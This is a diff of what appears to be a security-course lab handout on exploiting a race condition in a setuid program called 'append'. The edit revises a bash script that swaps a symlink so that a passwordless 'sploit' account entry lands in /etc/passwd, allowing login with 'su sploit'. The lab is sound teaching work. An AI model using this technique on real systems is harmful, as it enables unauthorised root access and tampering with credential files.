@@ -328,7 +328,7 @@ account.
 So our attack should write an entry like the `sploit` user entry
 above, but instead of "`x`", we can use the magic value given above,
 and we will be able to log in to the `sploit` account without
-a password.
+a password -- for instance, by running `su sploit`.
 
 [guest]: https://help.ubuntu.com/community/PasswordlessGuestAccount
 
@@ -369,24 +369,45 @@ Consider how we can increase the probability. For example, we can
 run the vulnerable program for many times; we only need to achieve success once among all these trials.
 Since you need to run the attacks and the vulnerable program for many times, you need to write a
 program to automate the attack process. To avoid manually typing an input to the vulnerable program
-vulp, you can use input redirection.
+`append`, you can use input redirection.
 
 Try saving the following file as `launch.sh`, and give it executable permissions:
 
 ```bash
 #!/usr/bin/env bash
 
-LIMIT=10
+# You can adjust LIMIT to change
+# the number of times the loop runs.
+LIMIT=1
+
+# uncommenting the following line will print
+# each command as it executes:
+#set -x
+
+orig_file=/tmp/XYZ
+target_file=/etc/passwd
 
 for ((i=0; i < LIMIT; i=i+1)); do
-  rm -rf /tmp/XYZ
-  touch /tmp/XYZ
+  rm -rf $orig_file
+  touch $orig_file
   # replace AAA with the text you want appended to /etc/passwd
-  (echo AAA | nice 19 ./append) &
-  unlink /tmp/XYZ
-  ln -s /etc/passwd /tmp/XYZ 
-  tail -n 1 /etc/passwd
+  (echo 'AAA' | nice -n 19 ./append) &
+  unlink $orig_file
+  ln -s $target_file $orig_file
+  # replace BBB with some string that will be found
+  # if your attack is successful.
+  # if you insert a `sleep()` in the append
+  # program, you'll also want to add a sleep command
+  # (see `man 1 sleep`)
+  # here, so your check waits til append has completed.
+  if grep 'BBB' $target_file > /dev/null; then
+    echo "attack succeeded"
+    exit 0
+  fi
 done
+
+echo "attack failed"
+exit 1
 ```
 
 If you give this program a higher `LIMIT` and run it, you likely will still not see
@@ -400,9 +421,12 @@ line (which calls the `sleep()` function, see `man 3 sleep`) --
   sleep(1);
 ```
 
-into `append.c`, before the call to `open()`. But a successful exploit of this
+into `append.c`, before the call to `open()`, then recompile `append`
+and run the `bash` script against it.
+
+But a successful exploit of this
 vulnerability should be able to (when run sufficiently many times) take
-advantage of the original program, even without the call to `sleep()`.
+advantage of the original `append` program, even without the call to `sleep()`.
 
 Hint: a C program will be much faster than the Bash script above, and
 the following C functions can be used to unlink (delete) a file
